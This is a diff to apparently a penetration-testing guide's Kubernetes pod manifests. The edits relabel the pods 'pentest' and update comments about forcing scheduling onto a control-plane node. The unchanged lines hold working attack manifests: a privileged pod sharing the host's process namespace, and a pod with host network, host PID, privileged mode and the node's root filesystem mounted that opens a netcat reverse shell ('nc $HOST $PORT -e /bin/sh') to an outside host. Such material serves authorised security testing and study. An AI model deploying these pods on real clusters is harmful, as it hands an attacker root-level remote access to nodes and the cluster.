@@ -11,7 +11,7 @@ kind: Pod
 metadata:
   name: pod-priv-and-hostpid
   labels: 
-    app: priv-and-hostpid
+    app: pentest
 spec:
   hostPID: true
   containers:
@@ -21,8 +21,8 @@ spec:
     args: [ "while true; do sleep 30; done;" ]
     securityContext:
       privileged: true
-  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
-  #nodeName: k8s-master
+  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
+  #nodeName: k8s-control-plane-node
   restartPolicy: Always
   ```
 [pod-priv-and-hostpid.yaml](pod-priv-and-hostpid.yaml)
@@ -53,7 +53,7 @@ kind: Pod
 metadata:
   name: pod-everything-allowed-revshell
   labels:
-    app: everything-allowed-revshell
+    app: pentest
 spec:
   hostNetwork: true
   hostPID: true
@@ -68,8 +68,8 @@ spec:
       name: noderoot
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
-  #nodeName: k8s-master
+  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
+  #nodeName: k8s-control-plane-node
   volumes:
   - name: noderoot
     hostPath:
